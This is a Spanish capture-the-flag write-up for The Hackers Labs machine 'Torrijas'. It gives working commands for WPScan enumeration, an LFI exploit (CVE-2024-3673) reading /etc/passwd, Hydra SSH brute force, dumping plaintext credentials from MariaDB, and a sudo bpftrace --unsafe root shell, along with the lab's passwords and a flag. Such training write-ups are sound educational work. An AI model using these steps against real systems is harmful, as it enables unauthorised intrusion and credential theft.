# Writeup: Torrijas (The Hackers Labs)

![Dificultad: Principiante](https://shields.io)
![SO: Linux](https://shields.io)
![Categoría: Seguridad Ofensiva](https://shields.io)

Torrijas es una máquina de nivel **Principiante** basada en una arquitectura Linux. La resolución de esta máquina abarca desde el escaneo con WPScan y la explotación de un Local File Inclusion (LFI) en un plugin de WordPress, pasando por fuerza bruta y extracción de bases de datos, hasta el abuso de `bpftrace` para la escalada de privilegios.

---

## 📊 Información General

* **Plataforma:** The Hackers Labs (VirtualBox)
* **Puntuación:** 10 Puntos
* **User Blood:** suraxddq
* **System Blood:** suraxddq

---

## 🥷 Fases del Hacking

### 1. Reconocimiento y Enumeración

El primer paso consiste en verificar la conectividad con la máquina objetivo mediante el comando `ping`.

```bash
ping -c 4 192.168.40.7
```

#### Enumeración de WordPress
Al detectar que el objetivo corre sobre WordPress (Versión 6.7.2), se lanza **WPScan** para enumerar usuarios, plugins y temas vulnerables:

```bash
wpscan --url http://192.168.56.106/wordpress/ -e u vp vt
```

**Hallazgos iniciales de WPScan:**
* `xmlrpc.php` habilitado.
* `readme.html` accesible.
* **Directory listing** activo en `/wordpress/wp-content/uploads/`.
* **Usuario identificado:** `administrator`

#### Identificación del Plugin
Al revisar manualmente el directorio `/uploads/` expuesto, se encuentra el archivo de estilos `w2dc-plugin.css`, el cual delata la presencia del plugin **web-directory-free**.

Se fuerza una enumeración exhaustiva de plugins para confirmar su estado:

```bash
wpscan --url http://192.168.56.106/wordpress/ --enumerate ap --force --plugins-detection mixed
```

**Resultado:** Se confirma el plugin **web-directory-free** en su **versión 1.7.2**.

---

### 2. Acceso Inicial e Intrusión

#### Explotación de CVE-2024-3673 (LFI)
La versión 1.7.2 de este plugin es vulnerable a **Local File Inclusion (LFI)**. Se utiliza un exploit público para automatizar la lectura de archivos del sistema apuntando hacia `/etc/passwd`:

```bash
python CVE-2024-3673.py --url http://192.168.40.7/wordpress/ --file /etc/passwd
```

El ataque tiene éxito y se extraen los usuarios con shell interactiva en el sistema:
* `debian`
* `premo`
* `primo`

#### Fuerza Bruta SSH
Con el usuario potencial `premo`, se lanza un ataque de diccionario con **Hydra** apuntando al servicio SSH:

```bash
hydra -l premo -P /usr/share/wordlists/rockyou.txt ssh://192.168.40.7 -t 64
```

* **Credenciales encontradas:** `premo:cassandra`

Nos conectamos de forma legítima al servidor:
```bash
ssh premo@192.168.40.7
```

Una vez dentro, listamos el directorio y capturamos la bandera de usuario:
```bash
premo@Torrija-TheHackersLabs:~$ ls
user.txt

premo@Torrija-TheHackersLabs:~$ cat user.txt
e7d95b3635f4d45c8bdd6bf31ad4673c
```
* **Flag de Usuario:** Contada en la plataforma como el ID `191`.

---

### 3. Movimiento Lateral (De premo a primo)

#### Enumeración de Base de Datos
Inspeccionando el archivo de configuración central de WordPress (`wp-config.php`), se buscan credenciales de acceso de base de datos. Como el puerto **3306** de **MariaDB** se encuentra expuesto localmente, se intenta la conexión como `root`:

```bash
mysql -u root -p
```

Una vez dentro de la consola de MariaDB, se procede con la enumeración de esquemas y tablas:

```sql
SHOW DATABASES;
USE Torrijas;
SHOW TABLES;
```

Se detecta una tabla crítica llamada `primo`. Al consultar todo su contenido:

```sql
SELECT * FROM primo;
```

* **Credenciales en texto plano obtenidas:** `primo:queazeshurmano`

Migramos de contexto en la shell al usuario correspondiente:
```bash
su primo
# Introducir contraseña: queazeshurmano
```

---

### 4. Escalada de Privilegios (A Root)

#### Tratamiento de la TTY
Para estabilizar la shell antes de la explotación, evitar fallos visuales y permitir interactividad completa, se ejecuta:

```bash
script /dev/null -c bash
stty raw -echo ; fg
```

#### Abuso de Sudo (bpftrace)
Revisamos las directrices de privilegios asignadas al usuario `primo`:

```bash
primo@Torrija-TheHackersLabs:~$ sudo -l
```

**Resultado:**
```text
User primo may run the following commands on Torrija-TheHackersLabs:
    (root) NOPASSWD: /usr/bin/bpftrace
```

De acuerdo con las técnicas de **GTFOBins**, el comando `/usr/bin/bpftrace` permite ejecutar comandos del sistema. Un intento básico generará protección por modo seguro (`safe mode`), por lo que inyectamos el parámetro `--unsafe` para forzar la apertura de una shell con privilegios de administrador:

```bash
sudo /usr/bin/bpftrace --unsafe -e 'BEGIN {system("/bin/bash"); exit()}'
```

#### Captura de la Flag de Root
¡Éxito! Ahora poseemos los máximos privilegios del sistema. Accedemos al directorio raíz de root y leemos la bandera final:

```bash
root@Torrija-TheHackersLabs:/home/premo# cd /root
root@Torrija-TheHackersLabs:~# cat root.txt
```
* **Flag de Root:** Contada en la plataforma como el ID `189`.

---

## 🛠️ Herramientas Utilizadas

* **WPScan:** Enumeración avanzada de CMS WordPress.
* **Exploit CVE-2024-3673:** Explotación de Local File Inclusion (LFI).
* **Hydra:** Fuerza bruta en servicios SSH.
* **MariaDB Client:** Extracción interna de bases de datos y credenciales.
* **bpftrace:** Evasión de entorno seguro y escalada de privilegios a nivel de Kernel.
* **Recurso:** https://ubh.natro92.fun/gtfobins/bpftrace/
```bash
sudo bpftrace -c /bin/sh -e 'END {exit()}'

```
